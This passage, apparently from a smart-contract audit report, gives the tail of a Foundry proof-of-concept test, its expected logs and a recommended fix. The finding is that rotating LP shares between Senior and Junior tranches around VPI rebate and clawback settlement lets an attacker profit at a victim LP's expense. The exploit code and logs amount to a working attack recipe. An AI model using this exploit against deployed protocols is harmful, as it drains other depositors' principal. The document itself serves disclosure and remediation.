        _finishAsyncCooldown(sourceVault, account);
        bytes[] memory refreshData = _mockPythUpdateData(1e8);
        vm.prank(account);
        router.updateMarkPrice(refreshData);
        redeemedAssets = sourceVault.estimateRedeemAssets(shares);
        uint256 requestedDepositAssets = redeemedAssets;

        uint256 freeAssets = settlementToken.balanceOf(account);
        if (freeAssets < redeemedAssets) {
            topUpAssets = redeemedAssets - freeAssets;
            settlementToken.mint(account, topUpAssets);
        }

        vm.startPrank(account);
        uint256 redeemRequestId = sourceVault.requestRedeem(shares, account, account);
        settlementToken.approve(address(destinationVault), redeemedAssets);
        uint256 depositRequestId = destinationVault.requestDeposit(redeemedAssets, account, account);
        vm.stopPrank();
        assertEq(depositRequestId, redeemRequestId, "rotation must settle in one epoch");

        vm.warp(pool.lpEpochStart(redeemRequestId));
        bytes[] memory updateData = _mockPythUpdateData(1e8);
        vm.prank(account);
        router.settleLpEpoch(updateData);

        uint256 fundedShares = sourceVault.claimableRedeemRequest(redeemRequestId, account);
        assertEq(fundedShares, shares, "rotation redemption must fund fully");
        vm.prank(account);
        uint256 claimedAssets = sourceVault.claimRedeem(redeemRequestId, fundedShares, account, account);
        assertApproxEqAbs(claimedAssets, redeemedAssets, 10e6, "quote drift must be limited to bounded carry");

        uint256 claimableDepositAssets = destinationVault.claimableDepositRequest(depositRequestId, account);
        assertEq(claimableDepositAssets, requestedDepositAssets, "rotation deposit must activate fully");
        vm.prank(account);
        destinationShares = destinationVault.claimDeposit(depositRequestId, claimableDepositAssets, account, account);
        redeemedAssets = claimedAssets;
    }

    function _accountWealth(
        address account
    ) private view returns (uint256 wealth) {
        wealth = settlementToken.balanceOf(account) + clearinghouse.balanceAssets(account)
            + engine.traderClaimBalanceAssets(account);
    }

    function _advanceOneHourWithFreshMark(
        address caller
    ) private {
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        bytes[] memory updateData = _mockPythUpdateData(1e8);
        vm.prank(caller);
        router.updateMarkPrice(updateData);
    }

    function _absoluteDifference(
        uint256 lhs,
        uint256 rhs
    ) private pure returns (uint256) {
        return lhs >= rhs ? lhs - rhs : rhs - lhs;
    }

}
```

Run:

```bash
cd packages/perps
forge test --match-path test/perps/differential/AuditVpiCrossTrancheOwnership.t.sol -vv
```

Expected result:

```text
Ran 2 tests for test/perps/differential/AuditVpiCrossTrancheOwnership.t.sol:AuditVpiCrossTrancheOwnershipTest
[PASS] test_ControlSameLifecycleWithoutRotationLosesMoney()
Logs:
  control final senior redemption: 590021555746
  control first bridge capital: 590005389623
  control second bridge top-up: 3041
  control attacker final wealth: 1279723542087
  control attacker contributed capital: 1280005392664
  control attacker net loss: 281850577
  control victim initial capital: 400000000000
  control victim redemption: 400130616545
  control victim gain: 130616545

[PASS] test_ExploitCrossTrancheRotationCapturesClawbackAndLeavesRebateLoss()
Logs:
  skewing position lifetime VPI: 768180266
  healing position rebate reserve: 767584668
  first rotation assets: 590010776254
  second rotation assets: 590464143982
  first bridge capital: 590005389623
  second bridge top-up: 453367734
  first rotation depth drift: 5386631
  second rotation depth drift: 6
  final senior redemption: 590474928720
  attacker final wealth: 1280624893067
  attacker contributed capital: 1280458757357
  attacker net profit: 166135710
  delayed close pool outflow: 607413895
  delayed close trader payout: 607413895
  victim initial capital: 400000000000
  victim redemption: 399682631379
  victim principal loss: 317368621

Suite result: ok. 2 passed; 0 failed; 0 skipped
```

All monetary log values use USDG's 6 decimals.

## Recommended Fix

Preserve ownership across the complete VPI lifecycle instead of treating each realized leg as revenue or loss for whoever owns the tranches at that instant.

A robust fix is to add a separate action-economics ownership ledger, distinct from terminal price PnL, that records:

1. which LP epoch/cohort funded each VPI rebate;
2. which cohort owns the corresponding future clawback;
3. outstanding skew-reducing rebate exposure that must reduce LP exit value before it is paid.

When a reserve is consumed, credit the cohort that funded the original rebate rather than current Junior principal. When LP shares enter, exit, or move across tranches, price them against the remaining action-economics asset/liability balance.

At minimum, add an invariant test that holds prices and pool depth constant and asserts that changing only Senior/Junior ownership around VPI reserve consumption cannot:

- turn an otherwise losing trader/LP lifecycle into realized profit; or
- transfer existing LP principal to the rotating account.


